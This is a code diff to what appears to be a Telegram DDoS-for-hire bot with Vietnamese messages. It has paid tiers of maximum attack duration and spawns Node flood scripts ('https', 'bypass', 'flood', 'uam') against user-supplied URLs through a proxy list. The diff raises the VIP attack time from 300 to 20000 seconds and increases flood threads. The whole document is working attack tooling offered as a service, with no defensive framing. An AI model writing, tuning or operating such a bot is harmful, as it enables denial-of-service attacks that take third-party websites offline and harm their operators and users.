@@ -28,7 +28,7 @@ def is_target_blocked(target):
 
 ADMIN_IDS = {7818408538}
 
-MAX_TIME_VIP = 300
+MAX_TIME_VIP = 20000
 MAX_TIME_BASIC = 150
 MAX_TIME_FREE = 60
 
@@ -323,7 +323,7 @@ def flood_command(message):
     send_intro(message.chat.id, "attack.gif")
     send_attack_status(message.chat.id, url, port, duration, "HTTPS", message.from_user.id)
     try:
-        subprocess.Popen(["node", "https", url, duration, "200", "60", "proxy.txt", "--query", "--query", "1", "--delay", "1", "--bfm", "--randrate", "1", "--full", "--http mix"])
+        subprocess.Popen(["node", "https", url, duration, "200", "60", "proxies.txt", "--query", "--query", "1", "--delay", "1", "--bfm", "--randrate", "1", "--full", "--http mix"])
     except Exception as e:
         bot.send_message(message.chat.id, f"⚠️ Lỗi HTTPS: {e}")
         
@@ -337,7 +337,7 @@ def flood_command(message):
     send_intro(message.chat.id, "attack.gif")
     send_attack_status(message.chat.id, url, port, duration, "BYPASS", message.from_user.id)
     try:
-        subprocess.Popen(["node", "bypass", url, duration, "50", "5", "proxy.txt"])
+        subprocess.Popen(["node", "bypass", url, duration, "50", "5", "proxies.txt"])
     except Exception as e:
         bot.send_message(message.chat.id, f"⚠️ Lỗi BYPASS: {e}")
         
@@ -350,7 +350,7 @@ def flood_command(message):
     send_intro(message.chat.id, "attack.gif")
     send_attack_status(message.chat.id, url, port, duration, "FLOOD", message.from_user.id)
     try:
-        subprocess.Popen(["node", "flood", url, duration, "5", "5", "proxy.txt"])
+        subprocess.Popen(["node", "flood", url, duration, "50", "5", "proxies.txt"])
     except Exception as e:
         bot.send_message(message.chat.id, f"⚠️ Lỗi FLOOD: {e}")
  
@@ -363,7 +363,7 @@ def flood_command(message):
     send_intro(message.chat.id, "attack.gif")
     send_attack_status(message.chat.id, url, port, duration, "UAM", message.from_user.id)
     try:
-        subprocess.Popen(["node", "uam", url, duration, "50", "5", "proxy.txt"])
+        subprocess.Popen(["node", "uam", url, duration, "50", "5", "proxies.txt"])
     except Exception as e:
         bot.send_message(message.chat.id, f"⚠️ Lỗi UAM: {e}")
         
